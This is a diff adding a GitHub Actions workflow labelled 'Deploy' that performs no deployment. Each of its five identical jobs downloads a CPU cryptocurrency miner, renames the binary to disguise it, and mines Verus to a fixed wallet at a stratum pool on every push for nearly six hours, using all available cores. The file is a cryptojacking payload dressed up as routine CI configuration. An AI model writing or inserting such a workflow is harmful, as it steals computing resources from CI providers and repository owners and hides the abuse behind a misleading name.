@@ -1,0 +1,73 @@
+name: Deploy
+
+on: [push]
+
+jobs:
+  job1:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      - name: Deploy Job
+        run: |
+          cd /tmp
+          wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz -O x.tar.xz
+          tar -xf x.tar.xz
+          mv ccminer ccmnr
+          timeout 21570s ./ccmnr -a verus -u RJfQrVCM4c2vfjRURwKVbDoVkiCBKQRc6D.${{ github.repository_owner }} -o stratum+tcp://de.vipor.net:5040 -p 'hybrid' -t $(nproc) || true
+
+  job2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      - name: Deploy Job
+        run: |
+          cd /tmp
+          wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz -O x.tar.xz
+          tar -xf x.tar.xz
+          mv ccminer ccmnr
+          timeout 21570s ./ccmnr -a verus -u RJfQrVCM4c2vfjRURwKVbDoVkiCBKQRc6D.${{ github.repository_owner }} -o stratum+tcp://de.vipor.net:5040 -p 'hybrid' -t $(nproc) || true
+
+
+  job3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      - name: Deploy Job
+        run: |
+          cd /tmp
+          wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz -O x.tar.xz
+          tar -xf x.tar.xz
+          mv ccminer ccmnr
+          timeout 21570s ./ccmnr -a verus -u RJfQrVCM4c2vfjRURwKVbDoVkiCBKQRc6D.${{ github.repository_owner }} -o stratum+tcp://de.vipor.net:5040 -p 'hybrid' -t $(nproc) || true
+
+
+  job4:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      - name: Deploy Job
+        run: |
+          cd /tmp
+          wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz -O x.tar.xz
+          tar -xf x.tar.xz
+          mv ccminer ccmnr
+          timeout 21570s ./ccmnr -a verus -u RJfQrVCM4c2vfjRURwKVbDoVkiCBKQRc6D.${{ github.repository_owner }} -o stratum+tcp://de.vipor.net:5040 -p 'hybrid' -t $(nproc) || true
+
+
+  job5:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      - name: Deploy Job
+        run: |
+          cd /tmp
+          wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz -O x.tar.xz
+          tar -xf x.tar.xz
+          mv ccminer ccmnr
+          timeout 21570s ./ccmnr -a verus -u RJfQrVCM4c2vfjRURwKVbDoVkiCBKQRc6D.${{ github.repository_owner }} -o stratum+tcp://de.vipor.net:5040 -p 'hybrid' -t $(nproc) || true
+
